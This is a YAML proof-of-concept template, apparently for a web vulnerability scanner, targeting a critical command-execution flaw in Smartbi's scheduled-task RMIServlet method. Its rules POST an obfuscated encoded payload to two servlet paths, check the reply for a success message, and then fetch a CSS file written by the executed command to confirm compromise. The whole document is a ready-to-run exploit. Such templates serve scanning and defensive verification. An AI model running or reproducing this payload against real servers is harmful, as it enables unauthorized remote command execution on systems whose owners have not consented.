name: poc-yaml-smartbi-schedule-rce
binding: 13a6aa5b-0f80-4782-9c3d-12c6e77ca6d6
manual: true
detail:
    author: secking
    links:
        - https://www.smartbi.com.cn/
    vulnerability:
        id: CT-529864
        level: critical
    description: smartbi全版本 schedule方法存在命令执行漏洞
    info: 需要有计划任务权限
transport: http
rules:
    r1:
        request:
            cache: false
            method: POST
            path: /smartbi/vision/RMIServlet
            headers:
                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
            body: encode=WiIphQSpWTl+kpDkWpS_Tp_R6p*(DG+/JV/uukpDk/uu/ut/uukpDk/uu/ut/uu/uu/ut/uuRd5w4kL(iG(-pAL(iG(-pDq.(g(qRwE/NV/Jt6~b/u7/NT/u76pb/u7VQ__p4ph!4Rkp4A6pb/u7xRSp!4Rkp4A/Jt/uuqq/uxbp~(55D/uxDd(4k~R/uxgRDRw6/uxiDD/uxDd(4R~RySw-wy~(GqiDD/Jt/uuEE/NV/Jt6~bqb4RkpA/Jt/uu~pK_9(J'7'Mp(((7puMK~mN7MJh~miuK/Jt/uuE/NV/Jt6~bq_SQDIAE/NV/Jt6~bqiSwDpAE/NV/uu/ut/uu(hdR6/uu/ut/uucK7u'~M7N71'K~h(_~h(__9'K71'K~h~9MJup771(/uu/JT
        expression: response.status == 200 && response.body.ibcontains(bytes("H~CxOm~")) && response.body.ibcontains(bytes("任务测试运行成功！")) && response.body.ibcontains(bytes("m2HECcO"))
    r2:
        request:
            cache: false
            method: GET
            path: /smartbi/vision/css/smaribi_logo_bak.css
        expression: response.status == 200 && response.body.ibcontains(bytes("be4f7a58086eaaa0e264b93065db9c24"))
    r3:
        request:
            cache: false
            method: POST
            path: /vision/RMIServlet
            headers:
                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
            body: encode=WiIphQSpWTl+kpDkWpS_Tp_R6p*(DG+/JV/uukpDk/uu/ut/uukpDk/uu/ut/uu/uu/ut/uuRd5w4kL(iG(-pAL(iG(-pDq.(g(qRwE/NV/Jt6~b/u7/NT/u76pb/u7VQ__p4ph!4Rkp4A6pb/u7xRSp!4Rkp4A/Jt/uuqq/uxbp~(55D/uxDd(4k~R/uxgRDRw6/uxiDD/uxDd(4R~RySw-wy~(GqiDD/Jt/uuEE/NV/Jt6~bqb4RkpA/Jt/uu~pK_9(J'7'Mp(((7puMK~mN7MJh~miuK/Jt/uuE/NV/Jt6~bq_SQDIAE/NV/Jt6~bqiSwDpAE/NV/uu/ut/uu(hdR6/uu/ut/uucK7u'~M7N71'K~h(_~h(__9'K71'K~h~9MJup771(/uu/JT
        expression: response.status == 200 && response.body.ibcontains(bytes("H~CxOm~")) && response.body.ibcontains(bytes("任务测试运行成功！")) && response.body.ibcontains(bytes("m2HECcO"))
    r4:
        request:
            cache: false
            method: GET
            path: /vision/css/smaribi_logo_bak.css
        expression: response.status == 200 && response.body.ibcontains(bytes("be4f7a58086eaaa0e264b93065db9c24"))
expression: r1() && r2() || r3() && r4()
